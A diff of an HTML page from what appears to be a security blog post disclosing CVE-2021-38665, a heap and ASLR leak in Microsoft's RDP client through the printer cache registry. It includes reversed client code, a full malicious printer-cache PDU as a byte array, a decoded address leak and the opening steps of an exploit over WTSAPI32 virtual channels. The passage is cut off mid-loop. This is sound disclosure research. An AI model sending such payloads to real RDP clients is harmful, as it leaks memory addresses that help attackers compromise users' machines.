@@ -7,7 +7,7 @@
 <meta name="description" content="Thalium blog." />
 <meta name="keywords" content="blog, tech" />
 <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
-<meta name="generator" content="Hugo 0.89.4" />
+<meta name="generator" content="Hugo 0.95.0" />
 
 <link rel="canonical" href="https://thalium.github.io/blog/posts/leaking-aslr-through-rdp-printer-cache-registry/">
 <meta property="og:title" content="Remote ASLR Leak in Microsoft&#39;s RDP Client through Printer Cache Registry (CVE-2021-38665)" />
@@ -228,79 +228,79 @@ if (!doNotTrack) {
   </figure>
 </p>
 <p>The PDU type &ldquo;Add Printer Cachedata&rdquo; (<code>DR_PRN_ADD_CACHEDATA</code>) is responsible for creating these registry keys. A bit of reversing will quickly show you that you totally control the key name (<code>PrinterName</code>), and to a certain extent, contents too.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">__int64</span> W32DrPRN<span style="color:#f92672">::</span>AddPrinterCacheInfo(DR_PRN_ADD_CACHEDATA <span style="color:#f92672">*</span> PduBody, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> PduBodyLength)
-{
-  DWORD dwDisposition;
-  HKEY phkResult, hKey;
-
-  <span style="color:#75715e">// ...
-</span><span style="color:#75715e"></span>  <span style="color:#75715e">// W32DrPRN::_maxCacheDataSize = 500000 bytes
-</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (PduBodyLength <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">||</span>
-      PduBody<span style="color:#f92672">-&gt;</span>PrintNameLen <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span>
-      PduBody<span style="color:#f92672">-&gt;</span>PnPNameLen <span style="color:#f92672">&gt;</span> W32DrPRN<span style="color:#f92672">::</span>_maxCacheDataSize <span style="color:#f92672">||</span>
-      PduBody<span style="color:#f92672">-&gt;</span>DriverNameLen <span style="color:#f92672">&gt;</span> W32DrPRN<span style="color:#f92672">::</span>_maxCacheDataSize <span style="color:#f92672">||</span>
-      PduBody<span style="color:#f92672">-&gt;</span>PrintNameLen <span style="color:#f92672">&gt;</span> W32DrPRN<span style="color:#f92672">::</span>_maxCacheDataSize <span style="color:#f92672">||</span>
-      PduBody<span style="color:#f92672">-&gt;</span>CachedFieldsLen <span style="color:#f92672">&gt;</span> W32DrPRN<span style="color:#f92672">::</span>_maxCacheDataSize) {
-    <span style="color:#75715e">// Error
-</span><span style="color:#75715e"></span>  }
-
-  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> TotalLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>PnPNameLen <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>DriverNameLen <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>PrintNameLen <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>CachedFieldsLen;
-
-  <span style="color:#66d9ef">if</span> (TotalLen <span style="color:#f92672">&gt;</span> PduBodyLength) { <span style="color:#75715e">/* Error */</span> }
-  <span style="color:#66d9ef">if</span> (TotalLen <span style="color:#f92672">&gt;</span> W32DrPRN<span style="color:#f92672">::</span>_maxCacheDataSize) { <span style="color:#75715e">/* Error */</span> }
-
-  <span style="color:#66d9ef">const</span> WCHAR <span style="color:#f92672">*</span> PrinterName <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> WCHAR <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)PduBody <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>PnPNameLen <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>DriverNameLen);
-
-  RegCreateKeyExW(
-    HKEY_CURRENT_USER,
-    <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Software</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Microsoft</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Terminal Server Client</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Default</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">AddIns</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">RDPDR&#34;</span>,
-    <span style="color:#ae81ff">0</span>,
-    <span style="color:#ae81ff">0</span>,
-    <span style="color:#ae81ff">0</span>,
-    <span style="color:#ae81ff">0xF003F</span>,
-    <span style="color:#ae81ff">0</span>,
-    <span style="color:#f92672">&amp;</span>hKey,
-    <span style="color:#f92672">&amp;</span>dwDisposition
-  );
-
-  RegCreateKeyExW(hKey, PrinterName, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xF003F</span>, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>phkResult, <span style="color:#f92672">&amp;</span>dwDisposition);
-  
-  RegSetValueExW(phkResult, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;PrinterCacheData&#34;</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, (<span style="color:#66d9ef">const</span> BYTE <span style="color:#f92672">*</span>)PduBody, TotalLen);
-  
-  <span style="color:#75715e">// ...
-</span><span style="color:#75715e"></span>}
-</code></pre></div><p>I don&rsquo;t think you can do much damage inside the registry itself with this kind of creation-of-a-subkey-with-arbitrary-name primitive. For instance, there is no such thing as a path traversal attack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> W32DrPRN<span style="color:#f92672">::</span>AddPrinterCacheInfo(DR_PRN_ADD_CACHEDATA <span style="color:#f92672">*</span> PduBody, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> PduBodyLength)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD dwDisposition;
+</span></span><span style="display:flex;"><span>  HKEY phkResult, hKey;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// W32DrPRN::_maxCacheDataSize = 500000 bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (PduBodyLength <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>      PduBody<span style="color:#f92672">-&gt;</span>PrintNameLen <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>      PduBody<span style="color:#f92672">-&gt;</span>PnPNameLen <span style="color:#f92672">&gt;</span> W32DrPRN<span style="color:#f92672">::</span>_maxCacheDataSize <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>      PduBody<span style="color:#f92672">-&gt;</span>DriverNameLen <span style="color:#f92672">&gt;</span> W32DrPRN<span style="color:#f92672">::</span>_maxCacheDataSize <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>      PduBody<span style="color:#f92672">-&gt;</span>PrintNameLen <span style="color:#f92672">&gt;</span> W32DrPRN<span style="color:#f92672">::</span>_maxCacheDataSize <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>      PduBody<span style="color:#f92672">-&gt;</span>CachedFieldsLen <span style="color:#f92672">&gt;</span> W32DrPRN<span style="color:#f92672">::</span>_maxCacheDataSize) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Error
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> TotalLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>PnPNameLen <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>DriverNameLen <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>PrintNameLen <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>CachedFieldsLen;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (TotalLen <span style="color:#f92672">&gt;</span> PduBodyLength) { <span style="color:#75715e">/* Error */</span> }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (TotalLen <span style="color:#f92672">&gt;</span> W32DrPRN<span style="color:#f92672">::</span>_maxCacheDataSize) { <span style="color:#75715e">/* Error */</span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> WCHAR <span style="color:#f92672">*</span> PrinterName <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> WCHAR <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)PduBody <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>PnPNameLen <span style="color:#f92672">+</span> PduBody<span style="color:#f92672">-&gt;</span>DriverNameLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  RegCreateKeyExW(
+</span></span><span style="display:flex;"><span>    HKEY_CURRENT_USER,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Software</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Microsoft</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Terminal Server Client</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Default</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">AddIns</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">RDPDR&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xF003F</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>hKey,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>dwDisposition
+</span></span><span style="display:flex;"><span>  );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  RegCreateKeyExW(hKey, PrinterName, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xF003F</span>, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>phkResult, <span style="color:#f92672">&amp;</span>dwDisposition);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  RegSetValueExW(phkResult, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;PrinterCacheData&#34;</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, (<span style="color:#66d9ef">const</span> BYTE <span style="color:#f92672">*</span>)PduBody, TotalLen);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>I don&rsquo;t think you can do much damage inside the registry itself with this kind of creation-of-a-subkey-with-arbitrary-name primitive. For instance, there is no such thing as a path traversal attack.</p>
 <p>However, something really bugged me out. Some key names in the registry seemed <strong>longer than usual</strong>, which made me think there could be an issue with <strong>length management</strong>.</p>
 <p>I couldn&rsquo;t find anything as interesting as controlling the size of an out-of-bounds through the different length fields, be it in this PDU type (Add Printer Cachedata) or other ones (Update Printer Cachedata, Rename Printer Cachedata&hellip;).</p>
 <p>Therefore, the bug naturally comes from the fact that the server can send a <strong>non-null-terminated wide string</strong> to the client as the <code>PrinterName</code>. It is naively passed to <code>RegCreateKeyExW</code> (the second one), which will create the key assuming its name stops at the first wide null-byte (two consecutive null bytes).</p>
 <h1 id="leaking-heap-through-the-client-registry">Leaking heap through the client registry</h1>
 <p>Here is an example of a malicious PDU that will trigger the bug:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> leak_heap[] <span style="color:#f92672">=</span> {
-  <span style="color:#75715e">// DR_PRN_ADD_CACHEDATA
-</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x50</span>,                         <span style="color:#75715e">// Header
-</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// EventId
-</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// PortDosName
-</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// PnpNameLen
-</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// DriverNameLen
-</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// PrintNameLen
-</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// CachedFieldsLen
-</span><span style="color:#75715e"></span>  <span style="color:#75715e">// DriverName
-</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x74</span>,
-  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>,
-  <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x50</span>,
-  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>,
-  <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x55</span>,
-  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
-  <span style="color:#75715e">// PrinterName
-</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x74</span>,
-  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>,
-  <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x50</span>,
-  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>,
-  <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x55</span>,
-  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>,
-  <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x64</span>
-};
-</code></pre></div><p>The only thing here that is really important to notice is that the <code>PrinterName</code> field never contains <code>0x00 0x00</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> leak_heap[] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// DR_PRN_ADD_CACHEDATA
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x50</span>,                         <span style="color:#75715e">// Header
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// EventId
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// PortDosName
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// PnpNameLen
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// DriverNameLen
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// PrintNameLen
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,                         <span style="color:#75715e">// CachedFieldsLen
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// DriverName
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x74</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x50</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x55</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// PrinterName
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x74</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x50</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x55</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x64</span>
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>The only thing here that is really important to notice is that the <code>PrinterName</code> field never contains <code>0x00 0x00</code>.</p>
 <p>Upon receiving this PDU from the server on the <code>RDPDR</code> channel, the client will enter <code>W32DrPRN::ProcessPrinterCacheInfo</code> and our message be dispatched to <code>W32DrPRN::AddPrinterCacheInfo</code>.</p>
 <p>
   <figure style="margin-top: 1em; margin-bottom: 1em">
@@ -336,9 +336,9 @@ if (!doNotTrack) {
   </figure>
 </p>
 <p>Let&rsquo;s copy the key name and encode it as UTF-16 (little endian):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#34;Brother DCP-1000 USB 扡摣⢍透䀀退鋘셠翻&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16le&#39;</span>)<span style="color:#f92672">.</span>hex()
-<span style="color:#e6db74">&#39;420072006f00740068006500720020004400430050002d00310030003000300020005500530042002000616263648d280f9000400090d89260c1fb7f&#39;</span>
-</code></pre></div><p>Our address leak does sit right at the end.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#34;Brother DCP-1000 USB 扡摣⢍透䀀退鋘셠翻&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16le&#39;</span>)<span style="color:#f92672">.</span>hex()
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;420072006f00740068006500720020004400430050002d00310030003000300020005500530042002000616263648d280f9000400090d89260c1fb7f&#39;</span>
+</span></span></code></pre></div><p>Our address leak does sit right at the end.</p>
 <p>Some tests in my environments (Windows 10 20H2 / 10.0.19041.844 and Windows 10 Insider Build / 10.0.21354.1) showed we could most of the time leak a few addresses of this kind. They are specific vtable pointers in <code>mstscax.dll</code>, allowing us to retrieve its <strong>base address</strong>.</p>
 <p>You can also probably try some heap spray, for instance by opening a lot of dummy dynamic channels and closing them. Dynamic channel managers that are allocated and freed in the heap contain vtable function pointers.</p>
 <p>But as long as it stays on the client&rsquo;s machine, there&rsquo;s no harm&hellip; right?</p>
@@ -394,33 +394,33 @@ if (!doNotTrack) {
 <h1 id="building-the-exploit">Building the exploit</h1>
 <p>Microsoft provides a very useful API called <a href="https://docs.microsoft.com/en-us/windows/win32/api/wtsapi32/"><strong>WTSAPI32</strong></a> to open a virtual channel over an RDP session, read from it, write to it, etc.</p>
 <p>You can <strong>open a virtual channel</strong> (static or dynamic) this way:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">HANDLE virtual_channel <span style="color:#f92672">=</span> WTSVirtualChannelOpenEx(
-  WTS_CURRENT_SESSION,
-  channel_name,
-  is_dynamic <span style="color:#f92672">?</span> WTS_CHANNEL_OPTION_DYNAMIC : <span style="color:#ae81ff">0</span>
-);
-</code></pre></div><p>Then, we can write to the channel handle this way:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">WTSVirtualChannelWrite(
-  virtual_channel,
-  buffer,
-  (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)length,
-  <span style="color:#f92672">&amp;</span>bytes_written
-);
-</code></pre></div><p><strong>Repeat the writing</strong> enough times to increase probability of leaking interesting stuff and we&rsquo;re done with the first steps.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; k<span style="color:#f92672">++</span>)
-{
